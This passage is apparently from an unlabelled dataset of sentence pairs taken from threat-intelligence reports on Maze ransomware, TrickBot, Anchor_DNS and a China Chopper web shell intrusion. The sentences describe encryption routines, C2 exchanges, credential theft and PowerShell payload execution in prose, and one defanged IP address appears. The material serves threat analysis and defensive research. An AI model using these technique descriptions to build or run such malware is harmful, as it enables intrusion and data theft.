        "S1": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "S2": "After the deletion process, the malware gets the function \u201cWow64RevertWow64FsRedirection\u201d using the function \u201cGetProcAddress\u201d and calls it in a dynamic way to leave the system in the same state as before.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S51<=>S92",
        "S1": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "S2": "The use of IP addresses instead of domain names is to avoid DNS resolutions that can be altered or redirected to a loopback, for example using the \u201chost\u201d file in Windows.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S56<=>S60",
        "S1": "In each execution the malware creates a Public BLOB of one RSA key that will be used to crypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information crypted with the public RSA blob created previously.",
        "S2": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S57<=>S60",
        "S1": "Just like other ransomware, this malware has an RSA Public BLOB embedded that will be imported to protect the RSA private BLOB of the victim.",
        "S2": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S58<=>S60",
        "S1": "Only the malware developers have the RSA private blob to decrypt their public RSA Blob.",
        "S2": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S59<=>S94",
        "S1": "This key is protected with a crypto using a key of 32 bits and iv of 8 bytes using the function \u201cCryptGenRandom\u201d to avoid memory dumps but, later, it will need to be decrypted before use.",
        "S2": "The malware uses this agent to make the connection, but it can change between samples:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S60<=>S63",
        "S1": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "S2": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S60<=>S96",
        "S1": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "S2": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S61<=>S64",
        "S1": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.",
        "S2": "- Check the existence of the file with the function \u201cSetFileAttributesW\u201d with the attribute \u201cFILE_ATTRIBUTE_ARCHIVE\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S61<=>S63",
        "S1": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.",
        "S2": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S63<=>S79",
        "S1": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "S2": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S65<=>S75",
        "S1": "- Reserve memory to the file with a call to \u201cVirtual Alloc\u201d for the key and iv.",
        "S2": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S66<=>S75",
        "S1": "- Open the file with read and write permissions with the function \u201cCreateFileW\u201d with the flag \u201cOPEN_EXISTING\u201d.",
        "S2": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S77<=>S79",
        "S1": "- Rename the file with the function \u201cMoveFileExW\u201d.",
        "S2": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S79<=>S81",
        "S1": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "S2": "- The image of the file is unmapped, and handles closed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S79<=>S83",
        "S1": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "S2": "The list of folders that the malware avoids are:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S87<=>S96",
        "S1": "It creates the ransom note in each folder that it can.",
        "S2": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S89<=>S91",
        "S1": "The malware tries to make connections to IP addresses that have been crypted in the binary to send information about the infected machine, as seen below:",
        "S2": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S91<=>S94",
        "S1": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "S2": "The malware uses this agent to make the connection, but it can change between samples:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S94<=>S99",
        "S1": "The malware uses this agent to make the connection, but it can change between samples:",
        "S2": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S96<=>S100",
        "S1": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "S2": "The webpage for making the payment requested in the ransom note gives a price and verifies that all is correct.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S99<=>S101",
        "S1": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:",
        "S2": "Maze has a chat function to contact the operators and receive information about how to obtain the cryptocurrency required to make payment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S0<=>S12",
        "S1": "The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named \u201cAnnual Bonus Report.doc\u201d.",
        "S2": "This information is crucial, as it determines the course of the attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S3<=>S7",
        "S1": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "S2": "Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S3<=>S9",
        "S1": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "S2": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S3<=>S5",
        "S1": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "S2": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S5<=>S9",
        "S1": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "S2": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S11<=>S45",
        "S1": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "S2": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S11<=>S13",
        "S1": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "S2": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S12<=>S44",
        "S1": "This information is crucial, as it determines the course of the attack.",
        "S2": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S13<=>S15",
        "S1": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "S2": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S15<=>S17",
        "S1": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "S2": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S17<=>S119",
        "S1": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "S2": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S17<=>S20",
        "S1": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "S2": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S17<=>S19",
        "S1": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "S2": "core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S20<=>S22",
        "S1": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "S2": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S22<=>S28",
        "S1": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "S2": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S22<=>S24",
        "S1": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "S2": "This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S26<=>S28",
        "S1": "Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.",
        "S2": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S27<=>S94",
        "S1": "TrickBot\u2019s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.",
        "S2": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S28<=>S35",
        "S1": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "S2": "The attacker also uses PowerShell to test DNS entry settings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S28<=>S77",
        "S1": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "S2": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S29<=>S35",
        "S1": "They gather information on:",
        "S2": "The attacker also uses PowerShell to test DNS entry settings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S35<=>S41",
        "S1": "The attacker also uses PowerShell to test DNS entry settings.",
        "S2": "The threat actor leverages PowerShell to send additional payloads to the target machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S37<=>S39",
        "S1": "They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.",
        "S2": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S38<=>S44",
        "S1": "With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.",
        "S2": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S39<=>S45",
        "S1": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "S2": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S42<=>S46",
        "S1": "They issue commands to fetch a payload from a secondary server and, once it\u2019s downloaded, immediately execute it on the target machine through PowerShell.",
        "S2": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S44<=>S93",
        "S1": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "S2": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S44<=>S132",
        "S1": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "S2": "However, in some instances of this attack, there was C2 server overlap between these infrastructures.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S44<=>S46",
        "S1": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "S2": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S45<=>S49",
        "S1": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "S2": "This information is sent to the C2 along with the `i` parameter.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S46<=>S51",
        "S1": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "S2": "If it does, the PowerShell script stops executing and kills the task.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S46<=>S50",
        "S1": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "S2": "When a response is received, the payload checks to see if the response matches the value cex01.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S46<=>S53",
        "S1": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "S2": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S49<=>S131",
        "S1": "This information is sent to the C2 along with the `i` parameter.",
        "S2": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S51<=>S55",
        "S1": "If it does, the PowerShell script stops executing and kills the task.",
        "S2": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S52<=>S54",
        "S1": "If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.",
        "S2": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S53<=>S55",
        "S1": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "S2": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S54<=>S56",
        "S1": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.",
        "S2": "The output of the command is sent back to the C2 server using a POST request with the \u201ca\u201d parameter.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S55<=>S58",
        "S1": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "S2": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S55<=>S73",
        "S1": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "S2": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S57<=>S66",
        "S1": "Meterpreter & Cobalt Strike Implants",
        "S2": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S58<=>S66",
        "S1": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "S2": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S59<=>S64",
        "S1": "The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory.",
        "S2": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S61<=>S64",
        "S1": "- Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented",
        "S2": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S66<=>S72",
        "S1": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "S2": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S67<=>S72",
        "S1": "The attacker uses the following metasploit modules:",
        "S2": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S72<=>S78",
        "S1": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "S2": "The ADfind tool has reportedly been used previously in attacks related to FIN6.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S72<=>S123",
        "S1": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "S2": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S73<=>S112",
        "S1": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:",
        "S2": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S75<=>S77",
        "S1": "After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.",
        "S2": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S77<=>S94",
        "S1": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "S2": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S79<=>S81",
        "S1": "One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security.",
        "S2": "Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S84<=>S90",
        "S1": "This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:",
        "S2": "anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S93<=>S110",
        "S1": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.",
        "S2": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S94<=>S110",
        "S1": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "S2": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S94<=>S135",
        "S1": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "S2": "This above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S95<=>S100",
        "S1": "The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.",
        "S2": "- New Variant : executes the malware\u2019s main communication module with the C2",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S100<=>S102",
        "S1": "- New Variant : executes the malware\u2019s main communication module with the C2",
        "S2": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S102<=>S105",
        "S1": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "S2": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S105<=>S107",
        "S1": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "S2": "Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S109<=>S112",
        "S1": "By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.",
        "S2": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S111<=>S113",
        "S1": "The malware is dubbed Anchor by its authors and has been active since August 2018.",
        "S2": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S113<=>S118",
        "S1": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.",
        "S2": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S114<=>S116",
        "S1": "Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.",
        "S2": "Similar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S118<=>S127",
        "S1": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:",
        "S2": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S119<=>S127",
        "S1": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "S2": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S119<=>S122",
        "S1": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "S2": "The request and response follow the same C2 communication format as TrickBot.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S121<=>S123",
        "S1": "Once it has established connectivity, it communicates with a set of hardcoded C2 servers.",
        "S2": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S123<=>S125",
        "S1": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "S2": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S125<=>S128",
        "S1": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "S2": "The same list is also used by TrickBot:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S125<=>S127",
        "S1": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "S2": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S127<=>S130",
        "S1": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "S2": "In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S128<=>S131",
        "S1": "The same list is also used by TrickBot:",
        "S2": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S131<=>S133",
        "S1": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "S2": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md::S133<=>S136",
        "S1": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:",
        "S2": "The same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S0<=>S5",
        "S1": "The initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process.",
        "S2": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S1<=>S3",
        "S1": "An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs.",
        "S2": "China Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S2<=>S8",
        "S1": "The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.",
        "S2": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S5<=>S16",
        "S1": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "S2": "We renamed this sample to maybemimi.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S5<=>S25",
        "S1": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "S2": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S8<=>S12",
        "S1": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "S2": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S9<=>S12",
        "S1": "One of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network.",
        "S2": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S12<=>S28",
        "S1": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "S2": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
